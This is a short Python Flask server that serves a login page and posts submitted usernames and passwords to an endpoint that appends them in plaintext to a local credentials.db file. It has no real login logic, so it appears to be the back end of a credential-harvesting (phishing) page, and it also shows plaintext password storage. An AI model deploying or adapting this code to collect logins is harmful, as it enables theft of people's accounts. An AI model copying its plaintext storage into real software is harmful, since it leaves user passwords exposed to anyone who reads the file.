from flask import Flask, render_template, request, jsonify
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/store_credentials', methods=['POST'])
def store_credentials():
    data = request.get_json()

    # Get credentials from the request
    username = data['username']
    password = data['password']

    # Save the credentials to a file (db file)
    with open('credentials.db', 'a') as db_file:
        db_file.write(f'{username},{password}\n')  # Store credentials as username,password

    return jsonify({'message': 'Credentials stored successfully'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
